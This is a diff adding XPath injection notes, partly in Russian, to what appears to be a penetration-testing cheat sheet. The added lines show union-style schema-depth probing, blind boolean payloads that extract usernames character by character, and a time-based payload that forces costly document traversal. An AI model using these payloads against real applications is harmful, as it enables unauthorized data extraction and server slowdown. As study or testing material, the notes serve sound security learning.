@@ -69,3 +69,37 @@
 - `string-length(name(/*[1]))=1`
 - `substring(name(/*[1]),1,1)='a'`
 - `count(/users/*)=1`
+
+### Приложение возвращает не все данные
+To iterate through the XML schema, we must first determine the schema depth. We can achieve this by ensuring the original XPath query returns no results and appending a new query that gives us information about the schema depth. We set the search term in the parameter `q` to anything that does not return data, for instance, `SOMETHINGINVALID`. We can then set the parameter `f` to `fullstreetname | /*[1]`. This results in the following XPath query:
+`/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | /*[1]`
+
+We can now determine the schema depth by iteratively appending an additional `/*[1]` to the subquery until the behavior of the web application changes. The results look like this (the q parameter remains the same as above for all requests):
+
+|query|Response|
+|--|--|
+|`fullstreetname \| /*[1]`|Nothing|
+|`fullstreetname \| /*[1]/*[1]`|Nothing|
+|`fullstreetname \| /*[1]/*[1]/*[1]`|Nothing|
+|`fullstreetname \| /*[1]/*[1]/*[1]/*[1]`|`01ST ST`|
+|`fullstreetname \| /*[1]/*[1]/*[1]/*[1]/*[1]`|Nothing|
+
+### Extracting information
+
+To exract information about 2 node:
+`fullstreetname | /*[1]/*[1]/*[2]/*[1]`
+
+
+#### Blind
+|query|result|Description|
+|--|--|--|
+|`invalid' or substring(name(/*[1]),1,1)='a' and '1'='1`|`/users/user[username='invalid' or substring(name(/*[1]),1,1)='a' and '1'='1']`|Count the length of the node|
+|`invalid' or substring(name(/*[1]),2,1)='a' and '1'='1`||Get name of the node|
+|`invalid' or count(/users/*)=1 and '1'='1`|`/users/user[username='invalid' or count(/users/*)=1 and '1'='1']`|Exfiltrating the Number of Child Nodes|
+|`invalid' or string-length(/users/user[1]/username)=1 and '1'='1`|`/users/user[username='invalid' or string-length(/users/user[1]/username)=1 and '1'='1']`|Exfiltrating Data(length)|
+|`invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1`|`/users/user[username='invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1']`|Exfiltrating Data (content)|
+
+##### Time-based Exploitation
+`invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1`
+
+If the condition `substring(/users/user[1]/username,1,1)='a'` is `true`, the second part of the `and` clause needs to be evaluated, such that the web application evaluates `count((//.)[count((//.))])` causing it to exponentially iterate over the entire XML document resulting in significant processing time. On the other hand, if the initial condition is `false`, the second part of the `and` clause does not need to be evaluated since the predicate will return `false` no matter what the second part evaluates. Therefore, the web application does not evaluate it. This difference in processing time enables us to determine whether our injected condition is true.
